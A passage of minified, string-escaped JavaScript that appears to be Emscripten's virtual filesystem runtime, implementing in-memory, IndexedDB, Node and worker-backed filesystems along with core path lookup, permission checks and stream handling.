ileDataAsRegularArray:(function(node){if(node.contents&&node.contents.subarray){var\x20arr=[];for(var\x20i=0;i<node.usedBytes;++i)arr.push(node.contents[i]);return\x20arr}return\x20node.contents}),getFileDataAsTypedArray:(function(node){if(!node.contents)return\x20new\x20Uint8Array;if(node.contents.subarray)return\x20node.contents.subarray(0,node.usedBytes);return\x20new\x20Uint8Array(node.contents)}),expandFileStorage:(function(node,newCapacity){if(node.contents&&node.contents.subarray&&newCapacity>node.contents.length){node.contents=MEMFS.getFileDataAsRegularArray(node);node.usedBytes=node.contents.length}if(!node.contents||node.contents.subarray){var\x20prevCapacity=node.contents?node.contents.length:0;if(prevCapacity>=newCapacity)return;var\x20CAPACITY_DOUBLING_MAX=1024*1024;newCapacity=Math.max(newCapacity,prevCapacity*(prevCapacity<CAPACITY_DOUBLING_MAX?2:1.125)|0);if(prevCapacity!=0)newCapacity=Math.max(newCapacity,256);var\x20oldContents=node.contents;node.contents=new\x20Uint8Array(newCapacity);if(node.usedBytes>0)node.contents.set(oldContents.subarray(0,node.usedBytes),0);return}if(!node.contents&&newCapacity>0)node.contents=[];while(node.contents.length<newCapacity)node.contents.push(0)}),resizeFileStorage:(function(node,newSize){if(node.usedBytes==newSize)return;if(newSize==0){node.contents=null;node.usedBytes=0;return}if(!node.contents||node.contents.subarray){var\x20oldContents=node.contents;node.contents=new\x20Uint8Array(new\x20ArrayBuffer(newSize));if(oldContents){node.contents.set(oldContents.subarray(0,Math.min(newSize,node.usedBytes)))}node.usedBytes=newSize;return}if(!node.contents)node.contents=[];if(node.contents.length>newSize)node.contents.length=newSize;else\x20while(node.contents.length<newSize)node.contents.push(0);node.usedBytes=newSize}),node_ops:{getattr:(function(node){var\x20attr={};attr.dev=FS.isChrdev(node.mode)?node.id:1;attr.ino=node.id;attr.mode=node.mode;attr.nlink=1;attr.uid=0;attr.gid=0;attr.rdev=node.rdev;if(FS.isDir(node.mode)){attr.size=4096}else\x20if(FS.isFile(node.mode)){attr.size=node.usedBytes}else\x20if(FS.isLink(node.mode)){attr.size=node.link.length}else{attr.size=0}attr.atime=new\x20Date(node.timestamp);attr.mtime=new\x20Date(node.timestamp);attr.ctime=new\x20Date(node.timestamp);attr.blksize=4096;attr.blocks=Math.ceil(attr.size/attr.blksize);return\x20attr}),setattr:(function(node,attr){if(attr.mode!==undefined){node.mode=attr.mode}if(attr.timestamp!==undefined){node.timestamp=attr.timestamp}if(attr.size!==undefined){MEMFS.resizeFileStorage(node,attr.size)}}),lookup:(function(parent,name){throw\x20FS.genericErrors[ERRNO_CODES.ENOENT]}),mknod:(function(parent,name,mode,dev){return\x20MEMFS.createNode(parent,name,mode,dev)}),rename:(function(old_node,new_dir,new_name){if(FS.isDir(old_node.mode)){var\x20new_node;try{new_node=FS.lookupNode(new_dir,new_name)}catch(e){}if(new_node){for(var\x20i\x20in\x20new_node.contents){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.ENOTEMPTY)}}}delete\x20old_node.parent.contents[old_node.name];old_node.name=new_name;new_dir.contents[new_name]=old_node;old_node.parent=new_dir}),unlink:(function(parent,name){delete\x20parent.contents[name]}),rmdir:(function(parent,name){var\x20node=FS.lookupNode(parent,name);for(var\x20i\x20in\x20node.contents){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.ENOTEMPTY)}delete\x20parent.contents[name]}),readdir:(function(node){var\x20entries=[\x22.\x22,\x22..\x22];for(var\x20key\x20in\x20node.contents){if(!node.contents.hasOwnProperty(key)){continue}entries.push(key)}return\x20entries}),symlink:(function(parent,newname,oldpath){var\x20node=MEMFS.createNode(parent,newname,511|40960,0);node.link=oldpath;return\x20node}),readlink:(function(node){if(!FS.isLink(node.mode)){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EINVAL)}return\x20node.link})},stream_ops:{read:(function(stream,buffer,offset,length,position){var\x20contents=stream.node.contents;if(position>=stream.node.usedBytes)return\x200;var\x20size=Math.min(stream.node.usedBytes-position,length);assert(size>=0);if(size>8&&contents.subarray){buffer.set(contents.subarray(position,position+size),offset)}else{for(var\x20i=0;i<size;i++)buffer[offset+i]=contents[position+i]}return\x20size}),write:(function(stream,buffer,offset,length,position,canOwn){if(!length)return\x200;var\x20node=stream.node;node.timestamp=Date.now();if(buffer.subarray&&(!node.contents||node.contents.subarray)){if(canOwn){node.contents=buffer.subarray(offset,offset+length);node.usedBytes=length;return\x20length}else\x20if(node.usedBytes===0&&position===0){node.contents=new\x20Uint8Array(buffer.subarray(offset,offset+length));node.usedBytes=length;return\x20length}else\x20if(position+length<=node.usedBytes){node.contents.set(buffer.subarray(offset,offset+length),position);return\x20length}}MEMFS.expandFileStorage(node,position+length);if(node.contents.subarray&&buffer.subarray)node.contents.set(buffer.subarray(offset,offset+length),position);else{for(var\x20i=0;i<length;i++){node.contents[position+i]=buffer[offset+i]}}node.usedBytes=Math.max(node.usedBytes,position+length);return\x20length}),llseek:(function(stream,offset,whence){var\x20position=offset;if(whence===1){position+=stream.position}else\x20if(whence===2){if(FS.isFile(stream.node.mode)){position+=stream.node.usedBytes}}if(position<0){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EINVAL)}return\x20position}),allocate:(function(stream,offset,length){MEMFS.expandFileStorage(stream.node,offset+length);stream.node.usedBytes=Math.max(stream.node.usedBytes,offset+length)}),mmap:(function(stream,buffer,offset,length,position,prot,flags){if(!FS.isFile(stream.node.mode)){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.ENODEV)}var\x20ptr;var\x20allocated;var\x20contents=stream.node.contents;if(!(flags&2)&&(contents.buffer===buffer||contents.buffer===buffer.buffer)){allocated=false;ptr=contents.byteOffset}else{if(position>0||position+length<stream.node.usedBytes){if(contents.subarray){contents=contents.subarray(position,position+length)}else{contents=Array.prototype.slice.call(contents,position,position+length)}}allocated=true;ptr=_malloc(length);if(!ptr){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.ENOMEM)}buffer.set(contents,ptr)}return{ptr:ptr,allocated:allocated}}),msync:(function(stream,buffer,offset,length,mmapFlags){if(!FS.isFile(stream.node.mode)){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.ENODEV)}if(mmapFlags&2){return\x200}var\x20bytesWritten=MEMFS.stream_ops.write(stream,buffer,0,length,offset,false);return\x200})}};var\x20IDBFS={dbs:{},indexedDB:(function(){if(typeof\x20indexedDB!==\x22undefined\x22)return\x20indexedDB;var\x20ret=null;if(typeof\x20window===\x22object\x22)ret=window.indexedDB||window.mozIndexedDB||window.webkitIndexedDB||window.msIndexedDB;assert(ret,\x22IDBFS\x20used,\x20but\x20indexedDB\x20not\x20supported\x22);return\x20ret}),DB_VERSION:21,DB_STORE_NAME:\x22FILE_DATA\x22,mount:(function(mount){return\x20MEMFS.mount.apply(null,arguments)}),syncfs:(function(mount,populate,callback){IDBFS.getLocalSet(mount,(function(err,local){if(err)return\x20callback(err);IDBFS.getRemoteSet(mount,(function(err,remote){if(err)return\x20callback(err);var\x20src=populate?remote:local;var\x20dst=populate?local:remote;IDBFS.reconcile(src,dst,callback)}))}))}),getDB:(function(name,callback){var\x20db=IDBFS.dbs[name];if(db){return\x20callback(null,db)}var\x20req;try{req=IDBFS.indexedDB().open(name,IDBFS.DB_VERSION)}catch(e){return\x20callback(e)}if(!req){return\x20callback(\x22Unable\x20to\x20connect\x20to\x20IndexedDB\x22)}req.onupgradeneeded=(function(e){var\x20db=e.target.result;var\x20transaction=e.target.transaction;var\x20fileStore;if(db.objectStoreNames.contains(IDBFS.DB_STORE_NAME)){fileStore=transaction.objectStore(IDBFS.DB_STORE_NAME)}else{fileStore=db.createObjectStore(IDBFS.DB_STORE_NAME)}if(!fileStore.indexNames.contains(\x22timestamp\x22)){fileStore.createIndex(\x22timestamp\x22,\x22timestamp\x22,{unique:false})}});req.onsuccess=(function(){db=req.result;IDBFS.dbs[name]=db;callback(null,db)});req.onerror=(function(e){callback(this.error);e.preventDefault()})}),getLocalSet:(function(mount,callback){var\x20entries={};function\x20isRealDir(p){return\x20p!==\x22.\x22&&p!==\x22..\x22}function\x20toAbsolute(root){return(function(p){return\x20PATH.join2(root,p)})}var\x20check=FS.readdir(mount.mountpoint).filter(isRealDir).map(toAbsolute(mount.mountpoint));while(check.length){var\x20path=check.pop();var\x20stat;try{stat=FS.stat(path)}catch(e){return\x20callback(e)}if(FS.isDir(stat.mode)){check.push.apply(check,FS.readdir(path).filter(isRealDir).map(toAbsolute(path)))}entries[path]={timestamp:stat.mtime}}return\x20callback(null,{type:\x22local\x22,entries:entries})}),getRemoteSet:(function(mount,callback){var\x20entries={};IDBFS.getDB(mount.mountpoint,(function(err,db){if(err)return\x20callback(err);var\x20transaction=db.transaction([IDBFS.DB_STORE_NAME],\x22readonly\x22);transaction.onerror=(function(e){callback(this.error);e.preventDefault()});var\x20store=transaction.objectStore(IDBFS.DB_STORE_NAME);var\x20index=store.index(\x22timestamp\x22);index.openKeyCursor().onsuccess=(function(event){var\x20cursor=event.target.result;if(!cursor){return\x20callback(null,{type:\x22remote\x22,db:db,entries:entries})}entries[cursor.primaryKey]={timestamp:cursor.key};cursor.continue()})}))}),loadLocalEntry:(function(path,callback){var\x20stat,node;try{var\x20lookup=FS.lookupPath(path);node=lookup.node;stat=FS.stat(path)}catch(e){return\x20callback(e)}if(FS.isDir(stat.mode)){return\x20callback(null,{timestamp:stat.mtime,mode:stat.mode})}else\x20if(FS.isFile(stat.mode)){node.contents=MEMFS.getFileDataAsTypedArray(node);return\x20callback(null,{timestamp:stat.mtime,mode:stat.mode,contents:node.contents})}else{return\x20callback(new\x20Error(\x22node\x20type\x20not\x20supported\x22))}}),storeLocalEntry:(function(path,entry,callback){try{if(FS.isDir(entry.mode)){FS.mkdir(path,entry.mode)}else\x20if(FS.isFile(entry.mode)){FS.writeFile(path,entry.contents,{encoding:\x22binary\x22,canOwn:true})}else{return\x20callback(new\x20Error(\x22node\x20type\x20not\x20supported\x22))}FS.chmod(path,entry.mode);FS.utime(path,entry.timestamp,entry.timestamp)}catch(e){return\x20callback(e)}callback(null)}),removeLocalEntry:(function(path,callback){try{var\x20lookup=FS.lookupPath(path);var\x20stat=FS.stat(path);if(FS.isDir(stat.mode)){FS.rmdir(path)}else\x20if(FS.isFile(stat.mode)){FS.unlink(path)}}catch(e){return\x20callback(e)}callback(null)}),loadRemoteEntry:(function(store,path,callback){var\x20req=store.get(path);req.onsuccess=(function(event){callback(null,event.target.result)});req.onerror=(function(e){callback(this.error);e.preventDefault()})}),storeRemoteEntry:(function(store,path,entry,callback){var\x20req=store.put(entry,path);req.onsuccess=(function(){callback(null)});req.onerror=(function(e){callback(this.error);e.preventDefault()})}),removeRemoteEntry:(function(store,path,callback){var\x20req=store.delete(path);req.onsuccess=(function(){callback(null)});req.onerror=(function(e){callback(this.error);e.preventDefault()})}),reconcile:(function(src,dst,callback){var\x20total=0;var\x20create=[];Object.keys(src.entries).forEach((function(key){var\x20e=src.entries[key];var\x20e2=dst.entries[key];if(!e2||e.timestamp>e2.timestamp){create.push(key);total++}}));var\x20remove=[];Object.keys(dst.entries).forEach((function(key){var\x20e=dst.entries[key];var\x20e2=src.entries[key];if(!e2){remove.push(key);total++}}));if(!total){return\x20callback(null)}var\x20completed=0;var\x20db=src.type===\x22remote\x22?src.db:dst.db;var\x20transaction=db.transaction([IDBFS.DB_STORE_NAME],\x22readwrite\x22);var\x20store=transaction.objectStore(IDBFS.DB_STORE_NAME);function\x20done(err){if(err){if(!done.errored){done.errored=true;return\x20callback(err)}return}if(++completed>=total){return\x20callback(null)}}transaction.onerror=(function(e){done(this.error);e.preventDefault()});create.sort().forEach((function(path){if(dst.type===\x22local\x22){IDBFS.loadRemoteEntry(store,path,(function(err,entry){if(err)return\x20done(err);IDBFS.storeLocalEntry(path,entry,done)}))}else{IDBFS.loadLocalEntry(path,(function(err,entry){if(err)return\x20done(err);IDBFS.storeRemoteEntry(store,path,entry,done)}))}}));remove.sort().reverse().forEach((function(path){if(dst.type===\x22local\x22){IDBFS.removeLocalEntry(path,done)}else{IDBFS.removeRemoteEntry(store,path,done)}}))})};var\x20NODEFS={isWindows:false,staticInit:(function(){NODEFS.isWindows=!!process.platform.match(/^win/)}),mount:(function(mount){assert(ENVIRONMENT_IS_NODE);return\x20NODEFS.createNode(null,\x22/\x22,NODEFS.getMode(mount.opts.root),0)}),createNode:(function(parent,name,mode,dev){if(!FS.isDir(mode)&&!FS.isFile(mode)&&!FS.isLink(mode)){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EINVAL)}var\x20node=FS.createNode(parent,name,mode);node.node_ops=NODEFS.node_ops;node.stream_ops=NODEFS.stream_ops;return\x20node}),getMode:(function(path){var\x20stat;try{stat=fs.lstatSync(path);if(NODEFS.isWindows){stat.mode=stat.mode|(stat.mode&146)>>1}}catch(e){if(!e.code)throw\x20e;throw\x20new\x20FS.ErrnoError(ERRNO_CODES[e.code])}return\x20stat.mode}),realPath:(function(node){var\x20parts=[];while(node.parent!==node){parts.push(node.name);node=node.parent}parts.push(node.mount.opts.root);parts.reverse();return\x20PATH.join.apply(null,parts)}),flagsToPermissionStringMap:{0:\x22r\x22,1:\x22r+\x22,2:\x22r+\x22,64:\x22r\x22,65:\x22r+\x22,66:\x22r+\x22,129:\x22rx+\x22,193:\x22rx+\x22,514:\x22w+\x22,577:\x22w\x22,578:\x22w+\x22,705:\x22wx\x22,706:\x22wx+\x22,1024:\x22a\x22,1025:\x22a\x22,1026:\x22a+\x22,1089:\x22a\x22,1090:\x22a+\x22,1153:\x22ax\x22,1154:\x22ax+\x22,1217:\x22ax\x22,1218:\x22ax+\x22,4096:\x22rs\x22,4098:\x22rs+\x22},flagsToPermissionString:(function(flags){flags&=~2097152;flags&=~2048;flags&=~32768;flags&=~524288;if(flags\x20in\x20NODEFS.flagsToPermissionStringMap){return\x20NODEFS.flagsToPermissionStringMap[flags]}else{throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EINVAL)}}),node_ops:{getattr:(function(node){var\x20path=NODEFS.realPath(node);var\x20stat;try{stat=fs.lstatSync(path)}catch(e){if(!e.code)throw\x20e;throw\x20new\x20FS.ErrnoError(ERRNO_CODES[e.code])}if(NODEFS.isWindows&&!stat.blksize){stat.blksize=4096}if(NODEFS.isWindows&&!stat.blocks){stat.blocks=(stat.size+stat.blksize-1)/stat.blksize|0}return{dev:stat.dev,ino:stat.ino,mode:stat.mode,nlink:stat.nlink,uid:stat.uid,gid:stat.gid,rdev:stat.rdev,size:stat.size,atime:stat.atime,mtime:stat.mtime,ctime:stat.ctime,blksize:stat.blksize,blocks:stat.blocks}}),setattr:(function(node,attr){var\x20path=NODEFS.realPath(node);try{if(attr.mode!==undefined){fs.chmodSync(path,attr.mode);node.mode=attr.mode}if(attr.timestamp!==undefined){var\x20date=new\x20Date(attr.timestamp);fs.utimesSync(path,date,date)}if(attr.size!==undefined){fs.truncateSync(path,attr.size)}}catch(e){if(!e.code)throw\x20e;throw\x20new\x20FS.ErrnoError(ERRNO_CODES[e.code])}}),lookup:(function(parent,name){var\x20path=PATH.join2(NODEFS.realPath(parent),name);var\x20mode=NODEFS.getMode(path);return\x20NODEFS.createNode(parent,name,mode)}),mknod:(function(parent,name,mode,dev){var\x20node=NODEFS.createNode(parent,name,mode,dev);var\x20path=NODEFS.realPath(node);try{if(FS.isDir(node.mode)){fs.mkdirSync(path,node.mode)}else{fs.writeFileSync(path,\x22\x22,{mode:node.mode})}}catch(e){if(!e.code)throw\x20e;throw\x20new\x20FS.ErrnoError(ERRNO_CODES[e.code])}return\x20node}),rename:(function(oldNode,newDir,newName){var\x20oldPath=NODEFS.realPath(oldNode);var\x20newPath=PATH.join2(NODEFS.realPath(newDir),newName);try{fs.renameSync(oldPath,newPath)}catch(e){if(!e.code)throw\x20e;throw\x20new\x20FS.ErrnoError(ERRNO_CODES[e.code])}}),unlink:(function(parent,name){var\x20path=PATH.join2(NODEFS.realPath(parent),name);try{fs.unlinkSync(path)}catch(e){if(!e.code)throw\x20e;throw\x20new\x20FS.ErrnoError(ERRNO_CODES[e.code])}}),rmdir:(function(parent,name){var\x20path=PATH.join2(NODEFS.realPath(parent),name);try{fs.rmdirSync(path)}catch(e){if(!e.code)throw\x20e;throw\x20new\x20FS.ErrnoError(ERRNO_CODES[e.code])}}),readdir:(function(node){var\x20path=NODEFS.realPath(node);try{return\x20fs.readdirSync(path)}catch(e){if(!e.code)throw\x20e;throw\x20new\x20FS.ErrnoError(ERRNO_CODES[e.code])}}),symlink:(function(parent,newName,oldPath){var\x20newPath=PATH.join2(NODEFS.realPath(parent),newName);try{fs.symlinkSync(oldPath,newPath)}catch(e){if(!e.code)throw\x20e;throw\x20new\x20FS.ErrnoError(ERRNO_CODES[e.code])}}),readlink:(function(node){var\x20path=NODEFS.realPath(node);try{path=fs.readlinkSync(path);path=NODEJS_PATH.relative(NODEJS_PATH.resolve(node.mount.opts.root),path);return\x20path}catch(e){if(!e.code)throw\x20e;throw\x20new\x20FS.ErrnoError(ERRNO_CODES[e.code])}})},stream_ops:{open:(function(stream){var\x20path=NODEFS.realPath(stream.node);try{if(FS.isFile(stream.node.mode)){stream.nfd=fs.openSync(path,NODEFS.flagsToPermissionString(stream.flags))}}catch(e){if(!e.code)throw\x20e;throw\x20new\x20FS.ErrnoError(ERRNO_CODES[e.code])}}),close:(function(stream){try{if(FS.isFile(stream.node.mode)&&stream.nfd){fs.closeSync(stream.nfd)}}catch(e){if(!e.code)throw\x20e;throw\x20new\x20FS.ErrnoError(ERRNO_CODES[e.code])}}),read:(function(stream,buffer,offset,length,position){if(length===0)return\x200;var\x20nbuffer=new\x20Buffer(length);var\x20res;try{res=fs.readSync(stream.nfd,nbuffer,0,length,position)}catch(e){throw\x20new\x20FS.ErrnoError(ERRNO_CODES[e.code])}if(res>0){for(var\x20i=0;i<res;i++){buffer[offset+i]=nbuffer[i]}}return\x20res}),write:(function(stream,buffer,offset,length,position){var\x20nbuffer=new\x20Buffer(buffer.subarray(offset,offset+length));var\x20res;try{res=fs.writeSync(stream.nfd,nbuffer,0,length,position)}catch(e){throw\x20new\x20FS.ErrnoError(ERRNO_CODES[e.code])}return\x20res}),llseek:(function(stream,offset,whence){var\x20position=offset;if(whence===1){position+=stream.position}else\x20if(whence===2){if(FS.isFile(stream.node.mode)){try{var\x20stat=fs.fstatSync(stream.nfd);position+=stat.size}catch(e){throw\x20new\x20FS.ErrnoError(ERRNO_CODES[e.code])}}}if(position<0){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EINVAL)}return\x20position})}};var\x20WORKERFS={DIR_MODE:16895,FILE_MODE:33279,reader:null,mount:(function(mount){assert(ENVIRONMENT_IS_WORKER);if(!WORKERFS.reader)WORKERFS.reader=new\x20FileReaderSync;var\x20root=WORKERFS.createNode(null,\x22/\x22,WORKERFS.DIR_MODE,0);var\x20createdParents={};function\x20ensureParent(path){var\x20parts=path.split(\x22/\x22);var\x20parent=root;for(var\x20i=0;i<parts.length-1;i++){var\x20curr=parts.slice(0,i+1).join(\x22/\x22);if(!createdParents[curr]){createdParents[curr]=WORKERFS.createNode(parent,parts[i],WORKERFS.DIR_MODE,0)}parent=createdParents[curr]}return\x20parent}function\x20base(path){var\x20parts=path.split(\x22/\x22);return\x20parts[parts.length-1]}Array.prototype.forEach.call(mount.opts[\x22files\x22]||[],(function(file){WORKERFS.createNode(ensureParent(file.name),base(file.name),WORKERFS.FILE_MODE,0,file,file.lastModifiedDate)}));(mount.opts[\x22blobs\x22]||[]).forEach((function(obj){WORKERFS.createNode(ensureParent(obj[\x22name\x22]),base(obj[\x22name\x22]),WORKERFS.FILE_MODE,0,obj[\x22data\x22])}));(mount.opts[\x22packages\x22]||[]).forEach((function(pack){pack[\x22metadata\x22].files.forEach((function(file){var\x20name=file.filename.substr(1);WORKERFS.createNode(ensureParent(name),base(name),WORKERFS.FILE_MODE,0,pack[\x22blob\x22].slice(file.start,file.end))}))}));return\x20root}),createNode:(function(parent,name,mode,dev,contents,mtime){var\x20node=FS.createNode(parent,name,mode);node.mode=mode;node.node_ops=WORKERFS.node_ops;node.stream_ops=WORKERFS.stream_ops;node.timestamp=(mtime||new\x20Date).getTime();assert(WORKERFS.FILE_MODE!==WORKERFS.DIR_MODE);if(mode===WORKERFS.FILE_MODE){node.size=contents.size;node.contents=contents}else{node.size=4096;node.contents={}}if(parent){parent.contents[name]=node}return\x20node}),node_ops:{getattr:(function(node){return{dev:1,ino:undefined,mode:node.mode,nlink:1,uid:0,gid:0,rdev:undefined,size:node.size,atime:new\x20Date(node.timestamp),mtime:new\x20Date(node.timestamp),ctime:new\x20Date(node.timestamp),blksize:4096,blocks:Math.ceil(node.size/4096)}}),setattr:(function(node,attr){if(attr.mode!==undefined){node.mode=attr.mode}if(attr.timestamp!==undefined){node.timestamp=attr.timestamp}}),lookup:(function(parent,name){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.ENOENT)}),mknod:(function(parent,name,mode,dev){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EPERM)}),rename:(function(oldNode,newDir,newName){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EPERM)}),unlink:(function(parent,name){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EPERM)}),rmdir:(function(parent,name){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EPERM)}),readdir:(function(node){var\x20entries=[\x22.\x22,\x22..\x22];for(var\x20key\x20in\x20node.contents){if(!node.contents.hasOwnProperty(key)){continue}entries.push(key)}return\x20entries}),symlink:(function(parent,newName,oldPath){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EPERM)}),readlink:(function(node){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EPERM)})},stream_ops:{read:(function(stream,buffer,offset,length,position){if(position>=stream.node.size)return\x200;var\x20chunk=stream.node.contents.slice(position,position+length);var\x20ab=WORKERFS.reader.readAsArrayBuffer(chunk);buffer.set(new\x20Uint8Array(ab),offset);return\x20chunk.size}),write:(function(stream,buffer,offset,length,position){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EIO)}),llseek:(function(stream,offset,whence){var\x20position=offset;if(whence===1){position+=stream.position}else\x20if(whence===2){if(FS.isFile(stream.node.mode)){position+=stream.node.size}}if(position<0){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EINVAL)}return\x20position})}};STATICTOP+=16;STATICTOP+=16;STATICTOP+=16;var\x20FS={root:null,mounts:[],devices:[null],streams:[],nextInode:1,nameTable:null,currentPath:\x22/\x22,initialized:false,ignorePermissions:true,trackingDelegate:{},tracking:{openFlags:{READ:1,WRITE:2}},ErrnoError:null,genericErrors:{},filesystems:null,syncFSRequests:0,handleFSError:(function(e){if(!(e\x20instanceof\x20FS.ErrnoError))throw\x20e+\x22\x20:\x20\x22+stackTrace();return\x20___setErrNo(e.errno)}),lookupPath:(function(path,opts){path=PATH.resolve(FS.cwd(),path);opts=opts||{};if(!path)return{path:\x22\x22,node:null};var\x20defaults={follow_mount:true,recurse_count:0};for(var\x20key\x20in\x20defaults){if(opts[key]===undefined){opts[key]=defaults[key]}}if(opts.recurse_count>8){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.ELOOP)}var\x20parts=PATH.normalizeArray(path.split(\x22/\x22).filter((function(p){return!!p})),false);var\x20current=FS.root;var\x20current_path=\x22/\x22;for(var\x20i=0;i<parts.length;i++){var\x20islast=i===parts.length-1;if(islast&&opts.parent){break}current=FS.lookupNode(current,parts[i]);current_path=PATH.join2(current_path,parts[i]);if(FS.isMountpoint(current)){if(!islast||islast&&opts.follow_mount){current=current.mounted.root}}if(!islast||opts.follow){var\x20count=0;while(FS.isLink(current.mode)){var\x20link=FS.readlink(current_path);current_path=PATH.resolve(PATH.dirname(current_path),link);var\x20lookup=FS.lookupPath(current_path,{recurse_count:opts.recurse_count});current=lookup.node;if(count++>40){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.ELOOP)}}}}return{path:current_path,node:current}}),getPath:(function(node){var\x20path;while(true){if(FS.isRoot(node)){var\x20mount=node.mount.mountpoint;if(!path)return\x20mount;return\x20mount[mount.length-1]!==\x22/\x22?mount+\x22/\x22+path:mount+path}path=path?node.name+\x22/\x22+path:node.name;node=node.parent}}),hashName:(function(parentid,name){var\x20hash=0;for(var\x20i=0;i<name.length;i++){hash=(hash<<5)-hash+name.charCodeAt(i)|0}return(parentid+hash>>>0)%FS.nameTable.length}),hashAddNode:(function(node){var\x20hash=FS.hashName(node.parent.id,node.name);node.name_next=FS.nameTable[hash];FS.nameTable[hash]=node}),hashRemoveNode:(function(node){var\x20hash=FS.hashName(node.parent.id,node.name);if(FS.nameTable[hash]===node){FS.nameTable[hash]=node.name_next}else{var\x20current=FS.nameTable[hash];while(current){if(current.name_next===node){current.name_next=node.name_next;break}current=current.name_next}}}),lookupNode:(function(parent,name){var\x20err=FS.mayLookup(parent);if(err){throw\x20new\x20FS.ErrnoError(err,parent)}var\x20hash=FS.hashName(parent.id,name);for(var\x20node=FS.nameTable[hash];node;node=node.name_next){var\x20nodeName=node.name;if(node.parent.id===parent.id&&nodeName===name){return\x20node}}return\x20FS.lookup(parent,name)}),createNode:(function(parent,name,mode,rdev){if(!FS.FSNode){FS.FSNode=(function(parent,name,mode,rdev){if(!parent){parent=this}this.parent=parent;this.mount=parent.mount;this.mounted=null;this.id=FS.nextInode++;this.name=name;this.mode=mode;this.node_ops={};this.stream_ops={};this.rdev=rdev});FS.FSNode.prototype={};var\x20readMode=292|73;var\x20writeMode=146;Object.defineProperties(FS.FSNode.prototype,{read:{get:(function(){return(this.mode&readMode)===readMode}),set:(function(val){val?this.mode|=readMode:this.mode&=~readMode})},write:{get:(function(){return(this.mode&writeMode)===writeMode}),set:(function(val){val?this.mode|=writeMode:this.mode&=~writeMode})},isFolder:{get:(function(){return\x20FS.isDir(this.mode)})},isDevice:{get:(function(){return\x20FS.isChrdev(this.mode)})}})}var\x20node=new\x20FS.FSNode(parent,name,mode,rdev);FS.hashAddNode(node);return\x20node}),destroyNode:(function(node){FS.hashRemoveNode(node)}),isRoot:(function(node){return\x20node===node.parent}),isMountpoint:(function(node){return!!node.mounted}),isFile:(function(mode){return(mode&61440)===32768}),isDir:(function(mode){return(mode&61440)===16384}),isLink:(function(mode){return(mode&61440)===40960}),isChrdev:(function(mode){return(mode&61440)===8192}),isBlkdev:(function(mode){return(mode&61440)===24576}),isFIFO:(function(mode){return(mode&61440)===4096}),isSocket:(function(mode){return(mode&49152)===49152}),flagModes:{\x22r\x22:0,\x22rs\x22:1052672,\x22r+\x22:2,\x22w\x22:577,\x22wx\x22:705,\x22xw\x22:705,\x22w+\x22:578,\x22wx+\x22:706,\x22xw+\x22:706,\x22a\x22:1089,\x22ax\x22:1217,\x22xa\x22:1217,\x22a+\x22:1090,\x22ax+\x22:1218,\x22xa+\x22:1218},modeStringToFlags:(function(str){var\x20flags=FS.flagModes[str];if(typeof\x20flags===\x22undefined\x22){throw\x20new\x20Error(\x22Unknown\x20file\x20open\x20mode:\x20\x22+str)}return\x20flags}),flagsToPermissionString:(function(flag){var\x20perms=[\x22r\x22,\x22w\x22,\x22rw\x22][flag&3];if(flag&512){perms+=\x22w\x22}return\x20perms}),nodePermissions:(function(node,perms){if(FS.ignorePermissions){return\x200}if(perms.indexOf(\x22r\x22)!==-1&&!(node.mode&292)){return\x20ERRNO_CODES.EACCES}else\x20if(perms.indexOf(\x22w\x22)!==-1&&!(node.mode&146)){return\x20ERRNO_CODES.EACCES}else\x20if(perms.indexOf(\x22x\x22)!==-1&&!(node.mode&73)){return\x20ERRNO_CODES.EACCES}return\x200}),mayLookup:(function(dir){var\x20err=FS.nodePermissions(dir,\x22x\x22);if(err)return\x20err;if(!dir.node_ops.lookup)return\x20ERRNO_CODES.EACCES;return\x200}),mayCreate:(function(dir,name){try{var\x20node=FS.lookupNode(dir,name);return\x20ERRNO_CODES.EEXIST}catch(e){}return\x20FS.nodePermissions(dir,\x22wx\x22)}),mayDelete:(function(dir,name,isdir){var\x20node;try{node=FS.lookupNode(dir,name)}catch(e){return\x20e.errno}var\x20err=FS.nodePermissions(dir,\x22wx\x22);if(err){return\x20err}if(isdir){if(!FS.isDir(node.mode)){return\x20ERRNO_CODES.ENOTDIR}if(FS.isRoot(node)||FS.getPath(node)===FS.cwd()){return\x20ERRNO_CODES.EBUSY}}else{if(FS.isDir(node.mode)){return\x20ERRNO_CODES.EISDIR}}return\x200}),mayOpen:(function(node,flags){if(!node){return\x20ERRNO_CODES.ENOENT}if(FS.isLink(node.mode)){return\x20ERRNO_CODES.ELOOP}else\x20if(FS.isDir(node.mode)){if(FS.flagsToPermissionString(flags)!==\x22r\x22||flags&512){return\x20ERRNO_CODES.EISDIR}}return\x20FS.nodePermissions(node,FS.flagsToPermissionString(flags))}),MAX_OPEN_FDS:4096,nextfd:(function(fd_start,fd_end){fd_start=fd_start||0;fd_end=fd_end||FS.MAX_OPEN_FDS;for(var\x20fd=fd_start;fd<=fd_end;fd++){if(!FS.streams[fd]){return\x20fd}}throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EMFILE)}),getStream:(function(fd){return\x20FS.streams[fd]}),createStream:(function(stream,fd_start,fd_end){if(!FS.FSStream){FS.FSStream=(function(){});FS.FSStream.prototype={};Object.defineProperties(FS.FSStream.prototype,{object:{get:(function(){return\x20this.node}),set:(function(val){this.node=val})},isRead:{get:(function(){return(this.flags&2097155)!==1})},isWrite:{get:(function(){return(this.flags&2097155)!==0})},isAppend:{get:(function(){return\x20this.flags&1024})}})}var\x20newStream=new\x20FS.FSStream;for(var\x20p\x20in\x20stream){newStream[p]=stream[p]}stream=newStream;var\x20fd=FS.nextfd(fd_start,fd_end);stream.fd=fd;